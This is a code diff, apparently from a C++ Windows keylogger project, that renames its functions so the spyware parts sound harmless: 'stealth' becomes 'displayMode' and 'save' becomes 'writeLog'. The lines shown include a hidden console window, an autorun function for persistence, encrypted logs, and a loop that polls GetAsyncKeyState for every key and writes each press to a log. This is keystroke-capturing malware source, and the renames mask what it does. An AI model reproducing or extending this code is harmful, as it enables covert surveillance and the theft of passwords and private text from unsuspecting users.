@@ -137,7 +137,7 @@ std::string encryptLogs(const std::string str, const int key)
 	return output;
 }
 
-int save(const int key)
+int writeLog(const int key)
 {
 	//Write log
 	std::ofstream out_file;
@@ -792,7 +792,7 @@ int save(const int key)
 	return 0;
 }
 
-void stealth(const unsigned short int display_mode)
+void displayMode(const unsigned short int display_mode)
 {
 	HWND stealth;
 	AllocConsole();
@@ -819,7 +819,7 @@ void addInAutorun()
 int main(int argc, char *argv[])
 {
 	#ifndef VISIBLE_UI
-	stealth(0); //1 - visible window, 0 - hidden window
+	displayMode(0); //1 - visible window, 0 - hidden window
 	#endif //VISIBLE_UI
 
 	#ifdef VISIBLE_UI
@@ -833,7 +833,7 @@ int main(int argc, char *argv[])
 
 	if (display_mode == 1 || display_mode == 0)
 	{
-		stealth(display_mode);
+		displayMode(display_mode);
 	}
 	else
 	{
@@ -855,7 +855,7 @@ int main(int argc, char *argv[])
 		{
 			if (GetAsyncKeyState(i) == -32767)
 			{
-				save(i);
+				writeLog(i);
 			}
 		}
 	}
